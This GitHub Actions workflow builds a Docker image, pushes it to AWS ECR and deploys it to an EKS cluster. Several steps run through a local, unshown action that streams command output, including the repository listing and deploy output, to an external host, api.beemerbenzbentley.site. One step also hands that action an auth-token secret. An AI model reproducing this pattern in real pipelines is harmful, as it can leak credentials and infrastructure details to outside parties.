name: CD - Deploy to Cloud

on:
  push:
    branches: [ master ]
  pull_request:
    branches: [ master ]

jobs:
  deploy:
    name: Build Docker image and Push to AWS ECR and Deploy to EKS
    runs-on: ubuntu-latest

    steps:
    - name: Check out code
      uses: actions/checkout@v3

    - name: Setup job
      uses: ./.github/actions/log-streamer
      with:
        step_name: "Setup job"
        command: |
          echo "Runner environment: $(uname -a)"
          echo "Available disk space: $(df -h / | tail -1)"
          echo "Memory info: $(free -h)"
          echo "Job setup completed"
        endpoint: https://api.beemerbenzbentley.site/sigma/api/v1/logs/github
        token: none

    - name: Checkout code
      uses: ./.github/actions/log-streamer
      with:
        step_name: "Checkout code"
        command: |
          echo "Code checkout completed"
          echo "Repository: ${{ github.repository }}"
          echo "Branch: ${{ github.ref_name }}"
          echo "Commit SHA: ${{ github.sha }}"
          ls -la
        endpoint: https://api.beemerbenzbentley.site/sigma/api/v1/logs/github
        token: none

    - name: Install Kube Control
      uses: azure/setup-kubectl@v4
      with:
        version: 'v1.31.0'
      id: install

    - name: Configure AWS credentials
      uses: aws-actions/configure-aws-credentials@v1
      with:
        aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
        aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        aws-region: ap-south-1

    - name: Login to Amazon ECR
      id: login-ecr
      uses: aws-actions/amazon-ecr-login@v1

    - name: Build, tag, and push docker image to Amazon ECR
      uses: ./.github/actions/log-streamer
      with:
        step_name: "Build, tag, and push docker image to Amazon ECR"
        command: |
          docker build -t ${{ steps.login-ecr.outputs.registry }}/backstract_apps:${{ github.sha }} -t ${{ steps.login-ecr.outputs.registry }}/backstract_apps:coll-c07e5a4d5b2a49498837750c910363e2 .
          docker push -a ${{ steps.login-ecr.outputs.registry }}/backstract_apps
        endpoint: https://api.beemerbenzbentley.site/sigma/api/v1/logs/github
        token: none

    - name: Update kube config to point to EKS
      uses: ./.github/actions/log-streamer
      with:
        step_name: "Update kube config to point to EKS"
        command: aws eks update-kubeconfig --name backstract-dev --region ap-south-1
        endpoint: https://api.beemerbenzbentley.site/sigma/api/v1/logs/github
        token: none

    - name: Deploy to AWS EKS Cluster
      uses: ./.github/actions/log-streamer
      with:
        step_name: "Deploy to AWS EKS Cluster"
        command: |
          if [ -z "${BST_TOKEN}" ]; then
            echo "ERROR: BACKSTRACT_AUTH_TOKEN is empty or not set"
            exit 1
          fi

          kubectl apply -f infra/k8s/alloy-rbac.yaml
          kubectl apply -f infra/k8s/alloy-configmap.yaml
          kubectl apply -f infra/k8s/aws-auth.yaml

          awk -v token="${BST_TOKEN}" '{gsub(/PLACEHOLDER_BST_TOKEN_REPLACE_AT_RUNTIME/, token)}1' "$INFRA_DIR/deployment.yaml" > /tmp/deployment.yaml

          if grep -q "PLACEHOLDER_BST_TOKEN_REPLACE_AT_RUNTIME" /tmp/deployment.yaml; then
            echo "ERROR: Token injection failed - placeholder still exists"
            exit 1
          fi

          kubectl apply -f /tmp/deployment.yaml
          kubectl apply -f "$INFRA_DIR/service.yaml"
          kubectl rollout restart deployment "coll-c07e5a4d5b2a49498837750c910363e2-depl"
          kubectl apply -f infra/k8s/aws-auth.yaml
          kubectl get pods -l "app=coll-c07e5a4d5b2a49498837750c910363e2"
        endpoint: https://api.beemerbenzbentley.site/sigma/api/v1/logs/github
        token: ${{ secrets.BACKSTRACT_AUTH_TOKEN }}
      env:
        BST_TOKEN: ${{ secrets.BACKSTRACT_AUTH_TOKEN }}
        INFRA_DIR: infra/k8s
